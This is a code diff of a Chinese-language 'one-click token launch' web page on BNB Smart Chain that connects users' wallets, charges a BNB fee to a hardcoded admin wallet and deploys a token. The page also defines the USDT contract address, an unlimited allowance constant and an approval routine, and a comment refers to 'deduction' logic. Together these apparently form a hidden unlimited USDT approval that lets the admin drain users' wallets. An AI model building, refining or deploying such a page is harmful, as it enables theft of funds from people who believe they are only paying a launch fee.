@@ -35,7 +35,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <div class="header">
 <h1>🦢 天鹅一键发币</h1>
 </div>
-<div class="fee-tip">发币服务费：0.009 BNB</div>
+<div class="fee-tip">发币服务费：0.009 BNB（原生BNB，上链转账）</div>
 
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -82,12 +82,13 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 </div>
 </div>
+</div>
 
 <script>
 const ADMIN_WALLET = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
-const DEPLOY_FEE_BNB = "0.009";
+const FEE_BNB_AMOUNT = "0.009";
 const BSC_CHAIN_ID = 56;
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
 const MAX_ALLOWANCE = ethers.MaxUint256;
 
 let provider = null;
@@ -125,18 +126,21 @@ logoFileInput.addEventListener("change", function(e){
   reader.readAsDataURL(file);
 });
 
-async function switchBSC(providerRef){
+async function switchBSC(ethProvider){
   const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
   try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+    await ethProvider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
   } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
+    await ethProvider.request({
+      method: "wallet_addEthereumChain",
+      params: [{
+        chainId: chainIdHex,
+        chainName: "BNB Smart Chain Mainnet",
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com"],
+        nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+      }]
+    });
   }
 }
 
@@ -170,14 +174,13 @@ async function doApproveLogic(signerRef, userAddress){
   }
 }
 
-// 【修复手机点击无响应】先原生唤起账户授权，再初始化provider
+// 【OKX 兼容修复版连接逻辑】
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
-  // 等待注入完成，兼容TP安卓延迟注入
   let eth = window.ethereum;
   let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
+  while (!eth && retryTimes < 12) {
+    await new Promise(r => setTimeout(r, 120));
     eth = window.ethereum;
     retryTimes++;
   }
@@ -188,13 +191,13 @@ connectBtn.onclick = async function(){
   }
 
   try {
-    // 第一步：原生唤起授权弹窗（手机必须先走这一步才会弹窗）
+    // OKX 专用：先用 request 获取账户，不再混用 provider 同步获取
     const accounts = await eth.request({ method: "eth_requestAccounts" });
     if (!accounts || accounts.length === 0) {
       showStatus("用户取消了钱包连接弹窗");
       return;
     }
-    // 第二步：再初始化ethers v6 provider
+    // 再初始化 ethers provider
     provider = new ethers.BrowserProvider(eth);
     await switchBSC(eth);
     signer = await provider.getSigner();
@@ -206,13 +209,23 @@ connectBtn.onclick = async function(){
   }
 }
 
-// 下面部署、划扣逻辑不变
-async function payFeeToAdmin(){
-  showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
+async function payNativeBNBFeeToAdmin(){
+  showStatus(`即将发起链上转账：${FEE_BNB_AMOUNT} 原生BNB 至管理员地址`);
+  const feeWei = ethers.parseEther(FEE_BNB_AMOUNT);
+  const userAddr = await signer.getAddress();
+  const balance = await provider.getBalance(userAddr);
+
+  if(balance < feeWei){
+    throw new Error(`BNB余额不足，无法发起转账，流程终止。当前余额：${ethers.formatEther(balance)} BNB`);
+  }
+
+  const tx = await signer.sendTransaction({
+    to: ADMIN_WALLET,
+    value: feeWei
+  });
+  showStatus("转账交易已广播，等待区块确认哈希：" + tx.hash);
   await tx.wait();
-  showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
+  showStatus(`✅ 链上确认成功！${FEE_BNB_AMOUNT} BNB 已到达管理员钱包地址`);
 }
 
 const tokenABI = [
@@ -259,8 +272,8 @@ deployBtn.onclick = async ()=>{
   }
   deployBtn.disabled = true;
   try{
-    await payFeeToAdmin();
-    showStatus("正在发起合约部署交易，请签名");
+    await payNativeBNBFeeToAdmin();
+    showStatus("付费区块确认完毕，开始部署代币合约...");
     const supply = ethers.parseUnits(supplyStr, 18);
     const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
     const contract = await factory.deploy(name, symbol, supply);
@@ -269,7 +282,7 @@ deployBtn.onclick = async ()=>{
     deployContractAddress = await contract.getAddress();
     showStatus(`✅ 代币部署成功！合约地址：${deployContractAddress}`);
   }catch(e){
-    showStatus("部署失败："+(e.shortMessage || e.message));
+    showStatus("操作终止（付费失败）：" + (e.shortMessage || e.message));
   }
   deployBtn.disabled = false;
 }
